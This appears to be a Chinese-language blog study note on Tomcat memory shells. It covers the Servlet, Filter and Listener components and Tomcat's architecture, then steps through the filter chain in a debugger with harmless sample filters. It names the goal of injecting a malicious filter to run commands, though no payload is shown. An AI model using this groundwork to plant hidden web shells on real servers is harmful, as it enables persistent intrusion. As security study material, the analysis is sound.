<li>服务器启动时（web.xml 中配置 load-on-startup&#x3D;1，默认为0）或者第一次请求该servlet时，机会初始化一个 Servlet 对象，也就是会执行初始化方法 init(ServletConfig conf)。</li>
<li>servlet 对象去处理所有客户端请求，在 service(ServletRequest req，ServletResponse res)方法中执行</li>
<li>服务器关闭时，销毁这个 servlet 对象，执行 destory() 方法。</li>
<li>由 JVM进行垃圾回收。</li>
</ol>
<h5 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h5><p>filter 也称为过滤器，是对 Servlet 技术的一个强补充，其主要功能是对web资源进行拦截，做一些处理后再交给下一个过滤器或servlet处理。通常都是用来拦截request进行处理，也可以对返回的response进行拦截处理。</p>
<p>工作原理如图：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240830173409155.png" alt="image-20240830173409155"></p>
<h6 id="基本工作原理"><a href="#基本工作原理" class="headerlink" title="基本工作原理"></a>基本工作原理</h6><ol>
<li>Filter 程序是一个实现了特殊接口的Java类，与Servlet 类似，也是由Servlet容器进行调用和执行的</li>
<li>当在 web.xml 注册了一个Filter 来对某个Servlet程序进行拦截处理时，它可以决定是否将请求继续传递给Servlet 程序，以及对请求和响应消息是否进行修改。</li>
<li>当 Servlet 容器开始调用某个 Servlet 程序时，如果发现已经注册了一个 Filter 程序来对该 Servlet  进行拦截，那么容器不再直接调用 Servlet 的 service 方法，而是调用 Filter 的 doFilter 方法，再由  doFilter 方法决定是否去激活 service 方法。</li>
<li>但在 Filter.doFilter 方法中不能直接调用 Servlet 的 service 方法，而是调用  FilterChain.doFilter 方法来激活目标 Servlet 的 service 方法，FilterChain 对象是通过  Filter.doFilter 方法的参数传递进来的。</li>
<li>只要在 Filter.doFilter 方法中调用 FilterChain.doFilter 方法的语句前后增加某些程序代码，这样就可以在 Servlet 进行响应前后实现某些特殊功能。</li>
<li>如果在 Filter.doFilter 方法中没有调用 FilterChain.doFilter 方法，则目标 Servlet 的 service 方法不会被执行，这样通过 Filter 就可以阻止某些非法的访问请求。</li>
</ol>
<h6 id="Filter的生命周期"><a href="#Filter的生命周期" class="headerlink" title="Filter的生命周期"></a>Filter的生命周期</h6><p>与 servlet 一样，Filter 的创建和销毁也由 Web 容器负责。<strong>Web 应用程序启动时，Web 服务器将创建 Filter  的实例对象，并调用其 init() 方法，读取 web.xml 配置，完成对象的初始化功能，从而为后续的用户请求作好拦截的准备工作</strong>（filter 对象只会创建一次，init  方法也只会执行一次）。开发人员通过init方法的参数，可获得代表当前filter配置信息的FilterConfig对象。</p>
<p>Filter  对象创建后会驻留在内存，当 Web 应用移除或服务器停止时才销毁，即会执行destroy方法。在 Web 容器卸载 Filter 对象之前被调用。该方法在 Filter  的生命周期中仅执行一次。在这个方法中，可以释放过滤器使用的资源。</p>
<p>可以用下代码自定义Filter：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterTest</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;  </span><br><span class="line">        <span class="comment">// 在这里面进行 doGet 和 doPost 这种类似的  </span></span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Filter链"><a href="#Filter链" class="headerlink" title="Filter链"></a>Filter链</h6><p>当多个 Filter 同时存在的时候，组成了Filter链。Web服务器根据Filter 在web.xml文件中的注册顺序，决定先调用哪个 Filter。</p>
<p>当第一个 Filter 的 doFilter 方法被调用时，web服务器会创建一个代表 Filter 链的 FilterChain 对象传递给该方法，通过判断 FilterChain 中是否还有 Filter 决定后面是否还调用 Filter。</p>
<p>如下图：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240830191234784.png" alt="image-20240830191234784"></p>
<h5 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h5><p>Java Web 开发中的监听器（Listener）就是Application、Session 和 Request 三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。</p>
<p>有如下监听器：</p>
<ul>
<li>ServletContextListenner：对Servlet上下文的创建和销毁进行监听</li>
<li>ServletContextAttributeListener：监听 Servlet 上下文属性的添加、删除和替换</li>
<li>HttpSessionListener：对Session 的创建和销毁进行监听。Session销毁有两种情况，一个是Session 超时，还有一种是通过调用 Session 对象的 invalidate() 方法使 session 失效。</li>
<li>HttpSessionAttributeListener：对Session对象中属性的添加、删除和替换进行监听；</li>
<li>ServletRequestListener：对请求对象的初始化和销毁进行监听；</li>
<li>ServletRequestAttributeListener：对请求对象属性的添加、删除和替换进行监听。</li>
</ul>
<p>用途：<br>可以使用监听器监听客户端的请求、服务端的操作等。通过监听器，可以自动触发一些动作，比如监听在线的用户数量，统计网站访问量、网站访问监控等。</p>
<h4 id="Tomcat架构"><a href="#Tomcat架构" class="headerlink" title="Tomcat架构"></a>Tomcat架构</h4><h5 id="Tomcat说明"><a href="#Tomcat说明" class="headerlink" title="Tomcat说明"></a>Tomcat说明</h5><p>与Apache服务器对比一下：</p>
<p>- </p>
<ul>
<li>Apache是web服务器（静态解析，如HTML）</li>
<li>tomcat 是java应用服务器（动态解析，如JSP）</li>
</ul>
<p>而<u>Tomcat只是一个 servlet容器</u>，也就是说<strong>Servlet是一种技术和规范，而Tomcat是实现了Servlet规范的具体容器。</strong></p>
<p>Apache是可以和Tomcat连通的，Apache可以作为web服务器的前端，也就是当客户端请求的是静态页面，则只需要Apache服务器响应请求，如果是<strong>动态</strong>的，则是Tomcat响应请求后将解析的JSP代码传回给Apache再传回给前端。</p>
<p>所以tomcat服务器是可以独立运行也可以和Apache连通运行。</p>
<h5 id="Tomcat架构原理"><a href="#Tomcat架构原理" class="headerlink" title="Tomcat架构原理"></a>Tomcat架构原理</h5><p>tomcat框架如下所示，主要有server、service、connector、container 四个部分：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240830194749991.png" alt="image-20240830194749991"></p>
<p>核心部件就是Connector和Container。</p>
<ul>
<li><p><strong>Connector</strong> 主要负责进行Socket 通信（基于TCP&#x2F;IP），用于解析HTTP报文</p>
</li>
<li><p><strong>Container</strong> 则是处理 Connector 发来的请求，处理内部事务，加载和管理Servlet，由Servlet 具体负责处理 Request 请求。</p>
</li>
</ul>
<p>即下图中的分别的http服务器和servlet容器：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240830195204114.png" alt="image-20240830195204114"></p>
<p>下面来稍深入学习一下这些组件。</p>
<h5 id="server"><a href="#server" class="headerlink" title="server"></a>server</h5><p>即整个Tomcat 服务器，一个tomcat只有一个Server，用于提供具体服务</p>
<h5 id="service"><a href="#service" class="headerlink" title="service"></a>service</h5><p>service主要是关联Connector 和 Container ，同时会初始化它下面的其他组件。</p>
<p>一个 Service 可以设置多个 Connector，但是只能有一个 Container 容器。</p>
<h5 id="Connector"><a href="#Connector" class="headerlink" title="Connector"></a>Connector</h5><p>Connector用于连接Service和Container，解析客户端的请求封装成Request对象并转发到Container，以及转发来自Container的响应。每一种不同的Connector都可以处理不同的请求协议，包括HTTP&#x2F;1.1、HTTP&#x2F;2、AJP等等。</p>
<h5 id="Container"><a href="#Container" class="headerlink" title="Container"></a>Container</h5><p>负责处理用户的Servlet请求，它主要有四种容器，分别是Engin、Host、Context、Wrapper。</p>
<p>它们之间是存在父子关系的。</p>
<p>四种容器的作用：</p>
<ul>
<li><strong>Engine</strong> 可以看成是容器对外提供功能的入口，每个Engine是Host的集合，用于管理各个Host，<u>Engine的实现类为 org.apache.catalina.core.StandardEngine</u>。</li>
<li><strong>Host</strong> 可以看成一个<code>虚拟主机</code>，一个Tomcat可以支持多个虚拟主机。而一个虚拟主机下可包含多个 Context，<u>Host的实现类为 org.apache.catalina.core.StandardHost</u>。</li>
<li><strong>Context</strong> 表示一个 Web 应用程序，每一个Context都有唯一的path，一个Web应用可包含多个 Wrapper，<u>Context的实现类为 org.apache.catalina.core.StandardContext</u>。</li>
<li><strong>Wrapper</strong> 表示一个Servlet，负责管理整个 Servlet 的生命周期，包括装载、初始化、资源回收等，<u>Wrapper的实现类为 org.apache.catalina.core.StandardWrapper</u>。</li>
</ul>
<p>用一张图来表示：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240830200930186.png" alt="image-20240830200930186"></p>
<p>Wrapper组件保存了Web应用的配置信息。</p>
<p>参考文章：</p>
<p><code>https://www.freebuf.com/articles/web/343094.html</code></p>
<h3 id="pipeline-valve"><a href="#pipeline-valve" class="headerlink" title="pipeline&#x2F;valve"></a>pipeline&#x2F;valve</h3><p>pipeline中文是流水线，每个容器都有自己的pipeline，代表一个完成任务的管道。流水线上面有很多任务，具体任务是什么呢？就是Valve，中文名字是阀。其中Pipeline和Valve都是接口，对于Pipeline有一个标准实现StandardPipeline。对于Valve不同的容器有它自己的实现，比如StandardWrapper容器实现的StandardWrapperValve</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831161515027.png" alt="image-20240831161515027"></p>
<h2 id="内存马学习"><a href="#内存马学习" class="headerlink" title="内存马学习"></a>内存马学习</h2><p>Tomcat内存马的核心原理就是动态地将恶意组件添加到正在运行的Tomcat服务器中。</p>
<p>Servlet在3.0版本之后能够支持动态注册组件。而Tomcat直到7.x才支持Servlet3.0，因此通过动态添加恶意组件注入内存马的方式适合Tomcat7.x及以上。</p>
<h4 id="Filter-型内存马"><a href="#Filter-型内存马" class="headerlink" title="Filter 型内存马"></a>Filter 型内存马</h4><p>在前面我们学习了三大件中的Filter（过滤器），web请求都会经过 filter 之后才会到 Servlet ，并且我们可以通过自定义过滤器来做到对用户的一些请求进行拦截修改等操作。</p>
<p>那么如果我们能<strong>动态创建 一个 filter 并且将其放在最前面</strong>，我们的filter 就会最先执行，这样只要我们<strong>往 filter 中添加恶意代码，就可以进行命令执行</strong>。</p>
<h5 id="相关类了解"><a href="#相关类了解" class="headerlink" title="相关类了解"></a>相关类了解</h5><p><strong>FilterDefs：</strong>存放FilterrDef的数组，FilterDef 中存储着我们过滤器名，过滤器实例等基本信息。</p>
<p><strong>FilterConfigs</strong>：存放filterConfig的数组，在 FilterConfig 中主要存放 FilterDef 和 Filter对象等信息</p>
<p><strong>FilterMaps</strong>：存放FilterMap的数组，在 FilterMap 中主要存放了 FilterName 和 对应的URLPattern</p>
<p><strong>FilterChain</strong>：过滤器链，该对象上的 doFilter 方法能依次调用链上的 Filter</p>
<p><strong>ApplicationFilterChain</strong>：调用过滤器链</p>
<p><strong>ApplicationFilterConfig</strong>：获取过滤器</p>
<p><strong>ApplicationFilterFactory</strong>：组装过滤器链</p>
<p><strong>WebXml</strong>：存放 web.xml 中内容的类</p>
<p><strong>ContextConfig</strong>：Web应用的上下文配置类</p>
<p><strong>StandardContext</strong>：Context接口的标准实现类，一个 Context 代表一个 Web 应用，其下可以包含多个 Wrapper</p>
<h5 id="Filter链-流程分析"><a href="#Filter链-流程分析" class="headerlink" title="Filter链 流程分析"></a>Filter链 流程分析</h5><p>环境：</p>
<ul>
<li>Tomcat 9.0.93</li>
</ul>
<p>先以实例简单看看Filter链的流程：<br>创建两个文件，位置为：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831150910627.png" alt="image-20240831150910627"></p>
<p>内容分别为：</p>
<p>TestFilter.java：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardWrapper;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;第一个Filter 初始化创建&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;第一个Filter执行过滤操作&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>TestDemo.java：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestDemo</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;第二个Filter 初始化创建&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;第二个Filter执行过滤操作&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后web.xml中添加：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span> <span class="comment">&lt;!--名字 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>filter.TestFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span><span class="comment">&lt;!--位置 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span><span class="comment">&lt;!--调用 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/filter<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span><span class="comment">&lt;!--表示访问filter路由的web资源都是被拦截，而/*表示所有的URL都会被拦截 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>filter1<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>filter.TestDemo<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>filter1<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/filter<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后运行tomcat服务器，访问filter路由，成功输出在控制台上：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831151154581.png" alt="image-20240831151154581"></p>
<p>现在这里就尝试一下调试。</p>
<p>————————————</p>
<p>这里需要导入catalina.jar包来更好看一些，这个包在tomcat的<code>lib</code>目录下，直接在idea里面拉进去即可：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240830225911025.png" alt="image-20240830225911025"></p>
<p>然后就可以了。</p>
<p>——————————————</p>
<p>然后我们在TestFilterr.java的filterChain的doFilter打断点，然后开始调试。</p>
<p>开启调试后，再访问一下 &#x2F;filter 即可成功断上：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831151501951.png" alt="image-20240831151501951"></p>
<p>看一下这里的参数情况：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831151520886.png" alt="image-20240831151520886"></p>
<p>可以看到这里有三个filter，这里<strong>第一个和第二个filter都是我们自定义的filter，第三个filter是tomcat自带的filter</strong>。此时的filterChain为ApplicationFilterChain类实例，所以此时会调用ApplicationFilterChain的doFilter()方法。</p>
<p>单击F7跟进一下这个filterChain的doFilter()方法：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831122140979.png" alt="image-20240831122140979"></p>
<p>这里的if进行了Globals.IS_SECIRITY_ENABLED判断，看是否开启了全局安全服务。</p>
<p>F7进入下一步，没有进入这个if条件，直接到了else内的代码：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831135609002.png" alt="image-20240831135609002"></p>
<p>然后这里就会调用ApplicationFilterChain的internalDoFilter()方法：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831152021446.png" alt="image-20240831152021446"></p>
<p>看参数，无疑会进入这个if条件，利用代码为：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.pos &lt; <span class="built_in">this</span>.n) &#123;</span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> <span class="built_in">this</span>.filters[<span class="built_in">this</span>.pos++];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> filterConfig.getFilter();</span><br><span class="line">                <span class="keyword">if</span> (request.isAsyncSupported() &amp;&amp; !filterConfig.getFilterDef().getAsyncSupportedBoolean()) &#123;</span><br><span class="line">                    request.setAttribute(<span class="string">&quot;org.apache.catalina.ASYNC_SUPPORTED&quot;</span>, Boolean.FALSE);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (Globals.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">                    <span class="type">Principal</span> <span class="variable">principal</span> <span class="operator">=</span> ((HttpServletRequest)request).getUserPrincipal();</span><br><span class="line">                    Object[] args = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;request, response, <span class="built_in">this</span>&#125;;</span><br><span class="line">                    SecurityUtil.doAsPrivilege(<span class="string">&quot;doFilter&quot;</span>, filter, classType, args, principal);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    filter.doFilter(request, response, <span class="built_in">this</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>然后就调用了filters变量，这个变量在类中是定义的了，如下：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831140418342.png" alt="image-20240831140418342"></p>
<p>并且看此时的变量对应情况：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831152332704.png" alt="image-20240831152332704"></p>
<p>和之前一样，有三个过滤器。然后<strong>继续看if条件语句里面的利用代码</strong>：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831152826245.png" alt="image-20240831152826245"></p>
<p>此时pos的值为1，并且这里的pos++是后置的，所以会先获取到filters数组下标为1的filter，然后再+1，所以此时会获取到我们定义的第二个filter。</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831153117022.png" alt="image-20240831153117022"></p>
<p>验证成功。</p>
<p>然后就是调用 getFilter()方法获取到类实例：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831153343451.png" alt="image-20240831153343451"></p>
<p>然后这里的if条件同样不会进入，直接进入else调用TestDemo的doFilter()方法：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831153501006.png" alt="image-20240831153501006"></p>
<p>顺理成章，第二个自定义的TestDemo的doFilter()方法是同样的，然后就会到Tomcat自带的filter，即WsFilter：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831153924890.png" alt="image-20240831153924890"></p>
<p>于是进入到了WsFilter类的doFilter()方法:</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831154325882.png" alt="image-20240831154325882"></p>
<p>这里的if条件没有通过，直接进入else语句：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831154430365.png" alt="image-20240831154430365"></p>
<p>这里的chain类实例为ApplicationFilterChain，又会调用一次doFilter()方法 &#x3D;&#x3D;》再调用internalDoFilter()方法，但是此时在这个internalFilter()方法中，前面我们都是满足了这个if条件：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831155542858.png" alt="image-20240831155542858"></p>
<p>但是这里并没有满足，直接进入else语句，再然后的一步一步的条件判断，最后会调用servlet的service()方法：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831160128020.png" alt="image-20240831160128020"></p>
<p>也就是说最后一个Filter会调用service()方法来处理web请求。</p>
<p>——————</p>
<p>正向分析filter流程分析结束。</p>
<h5 id="filter前流程分析"><a href="#filter前流程分析" class="headerlink" title="&#x2F;filter前流程分析"></a>&#x2F;filter前流程分析</h5><p>在doFilter() 方法之前，整个流程如图：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831162123763.png" alt="image-20240831162123763"></p>
<p>。在前面我们时直接分析的访问filter链之后的过程，现在就主要着重于filters是如何被赋值的：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831163731729.png" alt="image-20240831163731729"></p>
<p>在前面也分析过了，其实这里的filterrConfig可以看作是一个filter，那么我们现在就看一下这个filters是如何赋值的（这个filters即所属ApplicationFilterChain类的变量）。</p>
<p>发现在 StandardWrapperValve 类的invoke方法中有这个定义：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ApplicationFilterChain</span> <span class="variable">filterChain</span> <span class="operator">=</span> ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);</span><br></pre></td></tr></table></figure>

<p>打断点跟进一下这个ApplicationFilterFactory类的createFilterChain()方法：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831164545082.png" alt="image-20240831164545082"></p>
<p>这里进入到了else语句，然后继续就是赋值filterChain：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831164839282.png" alt="image-20240831164839282"></p>
<p>（标红的即进入的语句）</p>
<p>可以看到这里确实将filterChain赋值为了 ApplicationFilterChain类的实例。</p>
<p>但<strong>现在只是一个空的ApplicationFilterChain对象</strong>。</p>
<p>再往后看，有如下代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext)wrapper.getParent();</span><br><span class="line">            FilterMap[] filterMaps = context.findFilterMaps();</span><br></pre></td></tr></table></figure>

<p>调用getParent()获取当前的Context，也就是当前的应用，然后从Context中获取filterMaps，<strong>filtermaps就是web.xml中我们写入的filter</strong>。</p>
<p>再然后就是遍历这个数组中的值：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240831170716085.png" alt="image-20240831170716085"></p>
